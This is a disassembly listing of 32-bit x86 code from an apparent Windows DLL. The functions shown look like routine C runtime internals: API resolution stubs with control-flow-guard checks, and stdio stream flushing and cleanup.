100058a8:	ff 15 5c d1 00 10    	call   *0x1000d15c
100058ae:	ff d6                	call   *%esi
100058b0:	5e                   	pop    %esi
100058b1:	c3                   	ret
100058b2:	33 c0                	xor    %eax,%eax
100058b4:	40                   	inc    %eax
100058b5:	5e                   	pop    %esi
100058b6:	c3                   	ret
100058b7:	8b ff                	mov    %edi,%edi
100058b9:	55                   	push   %ebp
100058ba:	8b ec                	mov    %esp,%ebp
100058bc:	56                   	push   %esi
100058bd:	68 14 e4 00 10       	push   $0x1000e414
100058c2:	68 0c e4 00 10       	push   $0x1000e40c
100058c7:	68 68 dc 00 10       	push   $0x1000dc68
100058cc:	6a 03                	push   $0x3
100058ce:	e8 02 ff ff ff       	call   0x100057d5
100058d3:	8b f0                	mov    %eax,%esi
100058d5:	83 c4 10             	add    $0x10,%esp
100058d8:	85 f6                	test   %esi,%esi
100058da:	74 0f                	je     0x100058eb
100058dc:	ff 75 08             	push   0x8(%ebp)
100058df:	8b ce                	mov    %esi,%ecx
100058e1:	ff 15 5c d1 00 10    	call   *0x1000d15c
100058e7:	ff d6                	call   *%esi
100058e9:	eb 06                	jmp    0x100058f1
100058eb:	ff 15 a8 d0 00 10    	call   *0x1000d0a8
100058f1:	5e                   	pop    %esi
100058f2:	5d                   	pop    %ebp
100058f3:	c2 04 00             	ret    $0x4
100058f6:	8b ff                	mov    %edi,%edi
100058f8:	55                   	push   %ebp
100058f9:	8b ec                	mov    %esp,%ebp
100058fb:	56                   	push   %esi
100058fc:	68 1c e4 00 10       	push   $0x1000e41c
10005901:	68 14 e4 00 10       	push   $0x1000e414
10005906:	68 7c dc 00 10       	push   $0x1000dc7c
1000590b:	6a 04                	push   $0x4
1000590d:	e8 c3 fe ff ff       	call   0x100057d5
10005912:	8b f0                	mov    %eax,%esi
10005914:	83 c4 10             	add    $0x10,%esp
10005917:	85 f6                	test   %esi,%esi
10005919:	74 12                	je     0x1000592d
1000591b:	ff 75 08             	push   0x8(%ebp)
1000591e:	8b ce                	mov    %esi,%ecx
10005920:	ff 15 5c d1 00 10    	call   *0x1000d15c
10005926:	ff d6                	call   *%esi
10005928:	5e                   	pop    %esi
10005929:	5d                   	pop    %ebp
1000592a:	c2 04 00             	ret    $0x4
1000592d:	5e                   	pop    %esi
1000592e:	5d                   	pop    %ebp
1000592f:	ff 25 b4 d0 00 10    	jmp    *0x1000d0b4
10005935:	8b ff                	mov    %edi,%edi
10005937:	55                   	push   %ebp
10005938:	8b ec                	mov    %esp,%ebp
1000593a:	56                   	push   %esi
1000593b:	68 24 e4 00 10       	push   $0x1000e424
10005940:	68 1c e4 00 10       	push   $0x1000e41c
10005945:	68 8c dc 00 10       	push   $0x1000dc8c
1000594a:	6a 05                	push   $0x5
1000594c:	e8 84 fe ff ff       	call   0x100057d5
10005951:	8b f0                	mov    %eax,%esi
10005953:	83 c4 10             	add    $0x10,%esp
10005956:	85 f6                	test   %esi,%esi
10005958:	74 12                	je     0x1000596c
1000595a:	ff 75 08             	push   0x8(%ebp)
1000595d:	8b ce                	mov    %esi,%ecx
1000595f:	ff 15 5c d1 00 10    	call   *0x1000d15c
10005965:	ff d6                	call   *%esi
10005967:	5e                   	pop    %esi
10005968:	5d                   	pop    %ebp
10005969:	c2 04 00             	ret    $0x4
1000596c:	5e                   	pop    %esi
1000596d:	5d                   	pop    %ebp
1000596e:	ff 25 00 d0 00 10    	jmp    *0x1000d000
10005974:	8b ff                	mov    %edi,%edi
10005976:	55                   	push   %ebp
10005977:	8b ec                	mov    %esp,%ebp
10005979:	56                   	push   %esi
1000597a:	68 2c e4 00 10       	push   $0x1000e42c
1000597f:	68 24 e4 00 10       	push   $0x1000e424
10005984:	68 a0 dc 00 10       	push   $0x1000dca0
10005989:	6a 06                	push   $0x6
1000598b:	e8 45 fe ff ff       	call   0x100057d5
10005990:	8b f0                	mov    %eax,%esi
10005992:	83 c4 10             	add    $0x10,%esp
10005995:	85 f6                	test   %esi,%esi
10005997:	74 15                	je     0x100059ae
10005999:	ff 75 0c             	push   0xc(%ebp)
1000599c:	8b ce                	mov    %esi,%ecx
1000599e:	ff 75 08             	push   0x8(%ebp)
100059a1:	ff 15 5c d1 00 10    	call   *0x1000d15c
100059a7:	ff d6                	call   *%esi
100059a9:	5e                   	pop    %esi
100059aa:	5d                   	pop    %ebp
100059ab:	c2 08 00             	ret    $0x8
100059ae:	5e                   	pop    %esi
100059af:	5d                   	pop    %ebp
100059b0:	ff 25 b0 d0 00 10    	jmp    *0x1000d0b0
100059b6:	8b ff                	mov    %edi,%edi
100059b8:	55                   	push   %ebp
100059b9:	8b ec                	mov    %esp,%ebp
100059bb:	56                   	push   %esi
100059bc:	68 34 e4 00 10       	push   $0x1000e434
100059c1:	68 2c e4 00 10       	push   $0x1000e42c
100059c6:	68 b4 dc 00 10       	push   $0x1000dcb4
100059cb:	6a 12                	push   $0x12
100059cd:	e8 03 fe ff ff       	call   0x100057d5
100059d2:	8b f0                	mov    %eax,%esi
100059d4:	83 c4 10             	add    $0x10,%esp
100059d7:	85 f6                	test   %esi,%esi
100059d9:	74 15                	je     0x100059f0
100059db:	ff 75 10             	push   0x10(%ebp)
100059de:	8b ce                	mov    %esi,%ecx
100059e0:	ff 75 0c             	push   0xc(%ebp)
100059e3:	ff 75 08             	push   0x8(%ebp)
100059e6:	ff 15 5c d1 00 10    	call   *0x1000d15c
100059ec:	ff d6                	call   *%esi
100059ee:	eb 0c                	jmp    0x100059fc
100059f0:	ff 75 0c             	push   0xc(%ebp)
100059f3:	ff 75 08             	push   0x8(%ebp)
100059f6:	ff 15 a4 d0 00 10    	call   *0x1000d0a4
100059fc:	5e                   	pop    %esi
100059fd:	5d                   	pop    %ebp
100059fe:	c2 0c 00             	ret    $0xc
10005a01:	8b ff                	mov    %edi,%edi
10005a03:	55                   	push   %ebp
10005a04:	8b ec                	mov    %esp,%ebp
10005a06:	56                   	push   %esi
10005a07:	e8 ce fc ff ff       	call   0x100056da
10005a0c:	8b f0                	mov    %eax,%esi
10005a0e:	85 f6                	test   %esi,%esi
10005a10:	74 27                	je     0x10005a39
10005a12:	ff 75 28             	push   0x28(%ebp)
10005a15:	8b ce                	mov    %esi,%ecx
10005a17:	ff 75 24             	push   0x24(%ebp)
10005a1a:	ff 75 20             	push   0x20(%ebp)
10005a1d:	ff 75 1c             	push   0x1c(%ebp)
10005a20:	ff 75 18             	push   0x18(%ebp)
10005a23:	ff 75 14             	push   0x14(%ebp)
10005a26:	ff 75 10             	push   0x10(%ebp)
10005a29:	ff 75 0c             	push   0xc(%ebp)
10005a2c:	ff 75 08             	push   0x8(%ebp)
10005a2f:	ff 15 5c d1 00 10    	call   *0x1000d15c
10005a35:	ff d6                	call   *%esi
10005a37:	eb 20                	jmp    0x10005a59
10005a39:	ff 75 1c             	push   0x1c(%ebp)
10005a3c:	ff 75 18             	push   0x18(%ebp)
10005a3f:	ff 75 14             	push   0x14(%ebp)
10005a42:	ff 75 10             	push   0x10(%ebp)
10005a45:	ff 75 0c             	push   0xc(%ebp)
10005a48:	6a 00                	push   $0x0
10005a4a:	ff 75 08             	push   0x8(%ebp)
10005a4d:	e8 0c 00 00 00       	call   0x10005a5e
10005a52:	50                   	push   %eax
10005a53:	ff 15 d8 d0 00 10    	call   *0x1000d0d8
10005a59:	5e                   	pop    %esi
10005a5a:	5d                   	pop    %ebp
10005a5b:	c2 24 00             	ret    $0x24
10005a5e:	8b ff                	mov    %edi,%edi
10005a60:	55                   	push   %ebp
10005a61:	8b ec                	mov    %esp,%ebp
10005a63:	56                   	push   %esi
10005a64:	e8 8b fc ff ff       	call   0x100056f4
10005a69:	8b f0                	mov    %eax,%esi
10005a6b:	85 f6                	test   %esi,%esi
10005a6d:	74 12                	je     0x10005a81
10005a6f:	ff 75 0c             	push   0xc(%ebp)
10005a72:	8b ce                	mov    %esi,%ecx
10005a74:	ff 75 08             	push   0x8(%ebp)
10005a77:	ff 15 5c d1 00 10    	call   *0x1000d15c
10005a7d:	ff d6                	call   *%esi
10005a7f:	eb 09                	jmp    0x10005a8a
10005a81:	ff 75 08             	push   0x8(%ebp)
10005a84:	e8 6d 28 00 00       	call   0x100082f6
10005a89:	59                   	pop    %ecx
10005a8a:	5e                   	pop    %esi
10005a8b:	5d                   	pop    %ebp
10005a8c:	c2 08 00             	ret    $0x8
10005a8f:	b9 40 43 01 10       	mov    $0x10014340,%ecx
10005a94:	b8 b8 42 01 10       	mov    $0x100142b8,%eax
10005a99:	33 d2                	xor    %edx,%edx
10005a9b:	3b c8                	cmp    %eax,%ecx
10005a9d:	56                   	push   %esi
10005a9e:	8b 35 04 30 01 10    	mov    0x10013004,%esi
10005aa4:	1b c9                	sbb    %ecx,%ecx
10005aa6:	83 e1 de             	and    $0xffffffde,%ecx
10005aa9:	83 c1 22             	add    $0x22,%ecx
10005aac:	42                   	inc    %edx
10005aad:	89 30                	mov    %esi,(%eax)
10005aaf:	8d 40 04             	lea    0x4(%eax),%eax
10005ab2:	3b d1                	cmp    %ecx,%edx
10005ab4:	75 f6                	jne    0x10005aac
10005ab6:	b0 01                	mov    $0x1,%al
10005ab8:	5e                   	pop    %esi
10005ab9:	c3                   	ret
10005aba:	8b ff                	mov    %edi,%edi
10005abc:	55                   	push   %ebp
10005abd:	8b ec                	mov    %esp,%ebp
10005abf:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
10005ac3:	75 27                	jne    0x10005aec
10005ac5:	56                   	push   %esi
10005ac6:	be 68 42 01 10       	mov    $0x10014268,%esi
10005acb:	83 3e 00             	cmpl   $0x0,(%esi)
10005ace:	74 10                	je     0x10005ae0
10005ad0:	83 3e ff             	cmpl   $0xffffffff,(%esi)
10005ad3:	74 08                	je     0x10005add
10005ad5:	ff 36                	push   (%esi)
10005ad7:	ff 15 b8 d0 00 10    	call   *0x1000d0b8
10005add:	83 26 00             	andl   $0x0,(%esi)
10005ae0:	83 c6 04             	add    $0x4,%esi
10005ae3:	81 fe b8 42 01 10    	cmp    $0x100142b8,%esi
10005ae9:	75 e0                	jne    0x10005acb
10005aeb:	5e                   	pop    %esi
10005aec:	b0 01                	mov    $0x1,%al
10005aee:	5d                   	pop    %ebp
10005aef:	c3                   	ret
10005af0:	6a 10                	push   $0x10
10005af2:	68 18 24 01 10       	push   $0x10012418
10005af7:	e8 a4 cb ff ff       	call   0x100026a0
10005afc:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
10005b00:	6a 08                	push   $0x8
10005b02:	e8 25 0e 00 00       	call   0x1000692c
10005b07:	59                   	pop    %ecx
10005b08:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10005b0c:	6a 03                	push   $0x3
10005b0e:	5e                   	pop    %esi
10005b0f:	89 75 e0             	mov    %esi,-0x20(%ebp)
10005b12:	3b 35 18 41 01 10    	cmp    0x10014118,%esi
10005b18:	74 59                	je     0x10005b73
10005b1a:	a1 1c 41 01 10       	mov    0x1001411c,%eax
10005b1f:	8b 04 b0             	mov    (%eax,%esi,4),%eax
10005b22:	85 c0                	test   %eax,%eax
10005b24:	74 4a                	je     0x10005b70
10005b26:	8b 40 0c             	mov    0xc(%eax),%eax
10005b29:	90                   	nop
10005b2a:	c1 e8 0d             	shr    $0xd,%eax
10005b2d:	a8 01                	test   $0x1,%al
10005b2f:	74 16                	je     0x10005b47
10005b31:	a1 1c 41 01 10       	mov    0x1001411c,%eax
10005b36:	ff 34 b0             	push   (%eax,%esi,4)
10005b39:	e8 5b 28 00 00       	call   0x10008399
10005b3e:	59                   	pop    %ecx
10005b3f:	83 f8 ff             	cmp    $0xffffffff,%eax
10005b42:	74 03                	je     0x10005b47
10005b44:	ff 45 e4             	incl   -0x1c(%ebp)
10005b47:	a1 1c 41 01 10       	mov    0x1001411c,%eax
10005b4c:	8b 04 b0             	mov    (%eax,%esi,4),%eax
10005b4f:	83 c0 20             	add    $0x20,%eax
10005b52:	50                   	push   %eax
10005b53:	ff 15 a0 d0 00 10    	call   *0x1000d0a0
10005b59:	a1 1c 41 01 10       	mov    0x1001411c,%eax
10005b5e:	ff 34 b0             	push   (%eax,%esi,4)
10005b61:	e8 20 fb ff ff       	call   0x10005686
10005b66:	59                   	pop    %ecx
10005b67:	a1 1c 41 01 10       	mov    0x1001411c,%eax
10005b6c:	83 24 b0 00          	andl   $0x0,(%eax,%esi,4)
10005b70:	46                   	inc    %esi
10005b71:	eb 9c                	jmp    0x10005b0f
10005b73:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
10005b7a:	e8 13 00 00 00       	call   0x10005b92
10005b7f:	8b 45 e4             	mov    -0x1c(%ebp),%eax
10005b82:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10005b85:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10005b8c:	59                   	pop    %ecx
10005b8d:	5f                   	pop    %edi
10005b8e:	5e                   	pop    %esi
10005b8f:	5b                   	pop    %ebx
10005b90:	c9                   	leave
10005b91:	c3                   	ret
10005b92:	6a 08                	push   $0x8
10005b94:	e8 db 0d 00 00       	call   0x10006974
10005b99:	59                   	pop    %ecx
10005b9a:	c3                   	ret
10005b9b:	6a 08                	push   $0x8
10005b9d:	68 38 24 01 10       	push   $0x10012438
10005ba2:	e8 f9 ca ff ff       	call   0x100026a0
10005ba7:	8b 45 08             	mov    0x8(%ebp),%eax
10005baa:	ff 30                	push   (%eax)
10005bac:	e8 07 e7 ff ff       	call   0x100042b8
10005bb1:	59                   	pop    %ecx
10005bb2:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10005bb6:	8b 75 0c             	mov    0xc(%ebp),%esi
10005bb9:	ff 76 04             	push   0x4(%esi)
10005bbc:	8b 06                	mov    (%esi),%eax
10005bbe:	ff 30                	push   (%eax)
10005bc0:	e8 5b 01 00 00       	call   0x10005d20
10005bc5:	59                   	pop    %ecx
10005bc6:	59                   	pop    %ecx
10005bc7:	84 c0                	test   %al,%al
10005bc9:	74 32                	je     0x10005bfd
10005bcb:	8b 46 08             	mov    0x8(%esi),%eax
10005bce:	80 38 00             	cmpb   $0x0,(%eax)
10005bd1:	75 0e                	jne    0x10005be1
10005bd3:	8b 06                	mov    (%esi),%eax
10005bd5:	8b 00                	mov    (%eax),%eax
10005bd7:	8b 40 0c             	mov    0xc(%eax),%eax
10005bda:	90                   	nop
10005bdb:	d1 e8                	shr    $1,%eax
10005bdd:	a8 01                	test   $0x1,%al
10005bdf:	74 1c                	je     0x10005bfd
10005be1:	8b 06                	mov    (%esi),%eax
10005be3:	ff 30                	push   (%eax)
10005be5:	e8 f3 01 00 00       	call   0x10005ddd
10005bea:	59                   	pop    %ecx
10005beb:	83 f8 ff             	cmp    $0xffffffff,%eax
10005bee:	74 07                	je     0x10005bf7
10005bf0:	8b 46 04             	mov    0x4(%esi),%eax
10005bf3:	ff 00                	incl   (%eax)
10005bf5:	eb 06                	jmp    0x10005bfd
10005bf7:	8b 46 0c             	mov    0xc(%esi),%eax
10005bfa:	83 08 ff             	orl    $0xffffffff,(%eax)
10005bfd:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
10005c04:	e8 12 00 00 00       	call   0x10005c1b
10005c09:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10005c0c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10005c13:	59                   	pop    %ecx
10005c14:	5f                   	pop    %edi
10005c15:	5e                   	pop    %esi
10005c16:	5b                   	pop    %ebx
10005c17:	c9                   	leave
10005c18:	c2 0c 00             	ret    $0xc
10005c1b:	8b 45 10             	mov    0x10(%ebp),%eax
10005c1e:	ff 30                	push   (%eax)
10005c20:	e8 a7 e6 ff ff       	call   0x100042cc
10005c25:	59                   	pop    %ecx
10005c26:	c3                   	ret
10005c27:	6a 2c                	push   $0x2c
10005c29:	68 58 24 01 10       	push   $0x10012458
10005c2e:	e8 6d ca ff ff       	call   0x100026a0
10005c33:	8b 45 08             	mov    0x8(%ebp),%eax
10005c36:	ff 30                	push   (%eax)
10005c38:	e8 ef 0c 00 00       	call   0x1000692c
10005c3d:	59                   	pop    %ecx
10005c3e:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10005c42:	8b 35 1c 41 01 10    	mov    0x1001411c,%esi
10005c48:	a1 18 41 01 10       	mov    0x10014118,%eax
10005c4d:	8d 1c 86             	lea    (%esi,%eax,4),%ebx
10005c50:	8b 7d 0c             	mov    0xc(%ebp),%edi
10005c53:	89 75 d4             	mov    %esi,-0x2c(%ebp)
10005c56:	3b f3                	cmp    %ebx,%esi
10005c58:	74 4f                	je     0x10005ca9
10005c5a:	8b 06                	mov    (%esi),%eax
10005c5c:	89 45 e0             	mov    %eax,-0x20(%ebp)
10005c5f:	ff 37                	push   (%edi)
10005c61:	50                   	push   %eax
10005c62:	e8 b9 00 00 00       	call   0x10005d20
10005c67:	59                   	pop    %ecx
10005c68:	59                   	pop    %ecx
10005c69:	84 c0                	test   %al,%al
10005c6b:	74 37                	je     0x10005ca4
10005c6d:	8b 57 08             	mov    0x8(%edi),%edx
10005c70:	8b 4f 04             	mov    0x4(%edi),%ecx
10005c73:	8b 07                	mov    (%edi),%eax
10005c75:	8d 7d e0             	lea    -0x20(%ebp),%edi
10005c78:	89 7d c4             	mov    %edi,-0x3c(%ebp)
10005c7b:	89 45 c8             	mov    %eax,-0x38(%ebp)
10005c7e:	89 4d cc             	mov    %ecx,-0x34(%ebp)
10005c81:	89 55 d0             	mov    %edx,-0x30(%ebp)
10005c84:	8b 45 e0             	mov    -0x20(%ebp),%eax
10005c87:	89 45 dc             	mov    %eax,-0x24(%ebp)
10005c8a:	89 45 d8             	mov    %eax,-0x28(%ebp)
10005c8d:	8d 45 dc             	lea    -0x24(%ebp),%eax
10005c90:	50                   	push   %eax
10005c91:	8d 45 c4             	lea    -0x3c(%ebp),%eax
10005c94:	50                   	push   %eax
10005c95:	8d 45 d8             	lea    -0x28(%ebp),%eax
10005c98:	50                   	push   %eax
10005c99:	8d 4d e7             	lea    -0x19(%ebp),%ecx
10005c9c:	e8 fa fe ff ff       	call   0x10005b9b
10005ca1:	8b 7d 0c             	mov    0xc(%ebp),%edi
10005ca4:	83 c6 04             	add    $0x4,%esi
10005ca7:	eb aa                	jmp    0x10005c53
10005ca9:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
10005cb0:	e8 12 00 00 00       	call   0x10005cc7
10005cb5:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10005cb8:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10005cbf:	59                   	pop    %ecx
10005cc0:	5f                   	pop    %edi
10005cc1:	5e                   	pop    %esi
10005cc2:	5b                   	pop    %ebx
10005cc3:	c9                   	leave
10005cc4:	c2 0c 00             	ret    $0xc
10005cc7:	8b 45 10             	mov    0x10(%ebp),%eax
10005cca:	ff 30                	push   (%eax)
10005ccc:	e8 a3 0c 00 00       	call   0x10006974
10005cd1:	59                   	pop    %ecx
10005cd2:	c3                   	ret
10005cd3:	8b ff                	mov    %edi,%edi
10005cd5:	55                   	push   %ebp
10005cd6:	8b ec                	mov    %esp,%ebp
10005cd8:	83 ec 20             	sub    $0x20,%esp
10005cdb:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
10005cdf:	8d 45 f8             	lea    -0x8(%ebp),%eax
10005ce2:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
10005ce6:	8d 4d ff             	lea    -0x1(%ebp),%ecx
10005ce9:	89 45 e0             	mov    %eax,-0x20(%ebp)
10005cec:	8d 45 08             	lea    0x8(%ebp),%eax
10005cef:	89 45 e4             	mov    %eax,-0x1c(%ebp)
10005cf2:	8d 45 f4             	lea    -0xc(%ebp),%eax
10005cf5:	6a 08                	push   $0x8
10005cf7:	89 45 e8             	mov    %eax,-0x18(%ebp)
10005cfa:	58                   	pop    %eax
10005cfb:	89 45 f0             	mov    %eax,-0x10(%ebp)
10005cfe:	89 45 ec             	mov    %eax,-0x14(%ebp)
10005d01:	8d 45 f0             	lea    -0x10(%ebp),%eax
10005d04:	50                   	push   %eax
10005d05:	8d 45 e0             	lea    -0x20(%ebp),%eax
10005d08:	50                   	push   %eax
10005d09:	8d 45 ec             	lea    -0x14(%ebp),%eax
10005d0c:	50                   	push   %eax
10005d0d:	e8 15 ff ff ff       	call   0x10005c27
10005d12:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
10005d16:	8b 45 f8             	mov    -0x8(%ebp),%eax
10005d19:	75 03                	jne    0x10005d1e
10005d1b:	8b 45 f4             	mov    -0xc(%ebp),%eax
10005d1e:	c9                   	leave
10005d1f:	c3                   	ret
10005d20:	8b ff                	mov    %edi,%edi
10005d22:	55                   	push   %ebp
10005d23:	8b ec                	mov    %esp,%ebp
10005d25:	8b 45 08             	mov    0x8(%ebp),%eax
10005d28:	85 c0                	test   %eax,%eax
10005d2a:	74 1f                	je     0x10005d4b
10005d2c:	8b 48 0c             	mov    0xc(%eax),%ecx
10005d2f:	90                   	nop
10005d30:	8b c1                	mov    %ecx,%eax
10005d32:	c1 e8 0d             	shr    $0xd,%eax
10005d35:	a8 01                	test   $0x1,%al
10005d37:	74 12                	je     0x10005d4b
10005d39:	51                   	push   %ecx
10005d3a:	e8 14 00 00 00       	call   0x10005d53
10005d3f:	83 c4 04             	add    $0x4,%esp
10005d42:	84 c0                	test   %al,%al
10005d44:	75 09                	jne    0x10005d4f
10005d46:	8b 45 0c             	mov    0xc(%ebp),%eax
10005d49:	ff 00                	incl   (%eax)
10005d4b:	32 c0                	xor    %al,%al
10005d4d:	5d                   	pop    %ebp
10005d4e:	c3                   	ret
10005d4f:	b0 01                	mov    $0x1,%al
10005d51:	5d                   	pop    %ebp
10005d52:	c3                   	ret
10005d53:	8b ff                	mov    %edi,%edi
10005d55:	55                   	push   %ebp
10005d56:	8b ec                	mov    %esp,%ebp
10005d58:	8b 45 08             	mov    0x8(%ebp),%eax
10005d5b:	24 03                	and    $0x3,%al
10005d5d:	3c 02                	cmp    $0x2,%al
10005d5f:	75 06                	jne    0x10005d67
10005d61:	f6 45 08 c0          	testb  $0xc0,0x8(%ebp)
10005d65:	75 09                	jne    0x10005d70
10005d67:	f7 45 08 00 08 00 00 	testl  $0x800,0x8(%ebp)
10005d6e:	74 04                	je     0x10005d74
10005d70:	b0 01                	mov    $0x1,%al
10005d72:	5d                   	pop    %ebp
10005d73:	c3                   	ret
10005d74:	32 c0                	xor    %al,%al
10005d76:	5d                   	pop    %ebp
10005d77:	c3                   	ret
10005d78:	8b ff                	mov    %edi,%edi
10005d7a:	55                   	push   %ebp
10005d7b:	8b ec                	mov    %esp,%ebp
10005d7d:	8b 4d 08             	mov    0x8(%ebp),%ecx
10005d80:	56                   	push   %esi
10005d81:	57                   	push   %edi
10005d82:	8d 71 0c             	lea    0xc(%ecx),%esi
10005d85:	8b 16                	mov    (%esi),%edx
10005d87:	90                   	nop
10005d88:	8b c2                	mov    %edx,%eax
10005d8a:	24 03                	and    $0x3,%al
10005d8c:	3c 02                	cmp    $0x2,%al
10005d8e:	75 47                	jne    0x10005dd7
10005d90:	f6 c2 c0             	test   $0xc0,%dl
10005d93:	74 42                	je     0x10005dd7
10005d95:	8b 39                	mov    (%ecx),%edi
10005d97:	8b 41 04             	mov    0x4(%ecx),%eax
10005d9a:	2b f8                	sub    %eax,%edi
10005d9c:	89 01                	mov    %eax,(%ecx)
10005d9e:	83 61 08 00          	andl   $0x0,0x8(%ecx)
10005da2:	85 ff                	test   %edi,%edi
10005da4:	7e 31                	jle    0x10005dd7
10005da6:	57                   	push   %edi
10005da7:	50                   	push   %eax
10005da8:	51                   	push   %ecx
10005da9:	e8 76 0a 00 00       	call   0x10006824
10005dae:	59                   	pop    %ecx
10005daf:	50                   	push   %eax
10005db0:	e8 00 2f 00 00       	call   0x10008cb5
10005db5:	83 c4 0c             	add    $0xc,%esp
10005db8:	3b f8                	cmp    %eax,%edi
10005dba:	74 0b                	je     0x10005dc7
10005dbc:	6a 10                	push   $0x10
10005dbe:	58                   	pop    %eax
10005dbf:	f0 09 06             	lock or %eax,(%esi)
10005dc2:	83 c8 ff             	or     $0xffffffff,%eax
10005dc5:	eb 12                	jmp    0x10005dd9
10005dc7:	8b 06                	mov    (%esi),%eax
10005dc9:	90                   	nop
10005dca:	c1 e8 02             	shr    $0x2,%eax
10005dcd:	a8 01                	test   $0x1,%al
10005dcf:	74 06                	je     0x10005dd7
10005dd1:	6a fd                	push   $0xfffffffd
10005dd3:	58                   	pop    %eax
10005dd4:	f0 21 06             	lock and %eax,(%esi)
10005dd7:	33 c0                	xor    %eax,%eax
10005dd9:	5f                   	pop    %edi
10005dda:	5e                   	pop    %esi
10005ddb:	5d                   	pop    %ebp
10005ddc:	c3                   	ret
10005ddd:	8b ff                	mov    %edi,%edi
10005ddf:	55                   	push   %ebp
10005de0:	8b ec                	mov    %esp,%ebp
10005de2:	56                   	push   %esi
10005de3:	8b 75 08             	mov    0x8(%ebp),%esi
10005de6:	85 f6                	test   %esi,%esi
10005de8:	75 09                	jne    0x10005df3
10005dea:	56                   	push   %esi
10005deb:	e8 e3 fe ff ff       	call   0x10005cd3
10005df0:	59                   	pop    %ecx
10005df1:	eb 2f                	jmp    0x10005e22
10005df3:	56                   	push   %esi
10005df4:	e8 7f ff ff ff       	call   0x10005d78
10005df9:	59                   	pop    %ecx
10005dfa:	85 c0                	test   %eax,%eax
10005dfc:	75 21                	jne    0x10005e1f
10005dfe:	8b 46 0c             	mov    0xc(%esi),%eax
10005e01:	90                   	nop
10005e02:	c1 e8 0b             	shr    $0xb,%eax
10005e05:	a8 01                	test   $0x1,%al
10005e07:	74 12                	je     0x10005e1b
10005e09:	56                   	push   %esi
10005e0a:	e8 15 0a 00 00       	call   0x10006824
10005e0f:	50                   	push   %eax
10005e10:	e8 aa 26 00 00       	call   0x100084bf
10005e15:	59                   	pop    %ecx
10005e16:	59                   	pop    %ecx
10005e17:	85 c0                	test   %eax,%eax
10005e19:	75 04                	jne    0x10005e1f
10005e1b:	33 c0                	xor    %eax,%eax
10005e1d:	eb 03                	jmp    0x10005e22
10005e1f:	83 c8 ff             	or     $0xffffffff,%eax
10005e22:	5e                   	pop    %esi
10005e23:	5d                   	pop    %ebp
10005e24:	c3                   	ret
10005e25:	6a 01                	push   $0x1
10005e27:	e8 a7 fe ff ff       	call   0x10005cd3
10005e2c:	59                   	pop    %ecx
10005e2d:	c3                   	ret
10005e2e:	8b ff                	mov    %edi,%edi
10005e30:	55                   	push   %ebp
10005e31:	8b ec                	mov    %esp,%ebp
10005e33:	56                   	push   %esi
10005e34:	8b 75 08             	mov    0x8(%ebp),%esi
10005e37:	57                   	push   %edi
10005e38:	8d 7e 0c             	lea    0xc(%esi),%edi
10005e3b:	8b 07                	mov    (%edi),%eax
10005e3d:	90                   	nop
10005e3e:	c1 e8 0d             	shr    $0xd,%eax
10005e41:	a8 01                	test   $0x1,%al
10005e43:	74 25                	je     0x10005e6a
10005e45:	8b 07                	mov    (%edi),%eax
10005e47:	90                   	nop
10005e48:	c1 e8 06             	shr    $0x6,%eax
10005e4b:	a8 01                	test   $0x1,%al
10005e4d:	74 1b                	je     0x10005e6a
10005e4f:	ff 76 04             	push   0x4(%esi)
10005e52:	e8 2f f8 ff ff       	call   0x10005686
10005e57:	59                   	pop    %ecx
10005e58:	b8 bf fe ff ff       	mov    $0xfffffebf,%eax
10005e5d:	f0 21 07             	lock and %eax,(%edi)
10005e60:	33 c0                	xor    %eax,%eax
10005e62:	89 46 04             	mov    %eax,0x4(%esi)
10005e65:	89 06                	mov    %eax,(%esi)
10005e67:	89 46 08             	mov    %eax,0x8(%esi)
10005e6a:	5f                   	pop    %edi
10005e6b:	5e                   	pop    %esi
10005e6c:	5d                   	pop    %ebp
10005e6d:	c3                   	ret
10005e6e:	8b ff                	mov    %edi,%edi
10005e70:	55                   	push   %ebp
10005e71:	8b ec                	mov    %esp,%ebp
10005e73:	83 ec 48             	sub    $0x48,%esp
10005e76:	8d 45 b8             	lea    -0x48(%ebp),%eax
10005e79:	50                   	push   %eax
10005e7a:	ff 15 80 d0 00 10    	call   *0x1000d080
10005e80:	66 83 7d ea 00       	cmpw   $0x0,-0x16(%ebp)
10005e85:	0f 84 97 00 00 00    	je     0x10005f22
10005e8b:	53                   	push   %ebx
10005e8c:	8b 5d ec             	mov    -0x14(%ebp),%ebx
10005e8f:	85 db                	test   %ebx,%ebx
10005e91:	0f 84 8a 00 00 00    	je     0x10005f21
10005e97:	56                   	push   %esi
10005e98:	8b 33                	mov    (%ebx),%esi
10005e9a:	8d 43 04             	lea    0x4(%ebx),%eax
10005e9d:	03 c6                	add    %esi,%eax
10005e9f:	89 45 fc             	mov    %eax,-0x4(%ebp)
10005ea2:	b8 00 20 00 00       	mov    $0x2000,%eax
10005ea7:	3b f0                	cmp    %eax,%esi
10005ea9:	7c 02                	jl     0x10005ead
10005eab:	8b f0                	mov    %eax,%esi
10005ead:	56                   	push   %esi
10005eae:	e8 86 31 00 00       	call   0x10009039
10005eb3:	a1 40 45 01 10       	mov    0x10014540,%eax
10005eb8:	59                   	pop    %ecx
10005eb9:	3b f0                	cmp    %eax,%esi
10005ebb:	7e 02                	jle    0x10005ebf
10005ebd:	8b f0                	mov    %eax,%esi
10005ebf:	57                   	push   %edi
10005ec0:	33 ff                	xor    %edi,%edi
10005ec2:	85 f6                	test   %esi,%esi
10005ec4:	74 59                	je     0x10005f1f
10005ec6:	8b 45 fc             	mov    -0x4(%ebp),%eax
10005ec9:	8b 08                	mov    (%eax),%ecx
10005ecb:	83 f9 ff             	cmp    $0xffffffff,%ecx
10005ece:	74 44                	je     0x10005f14
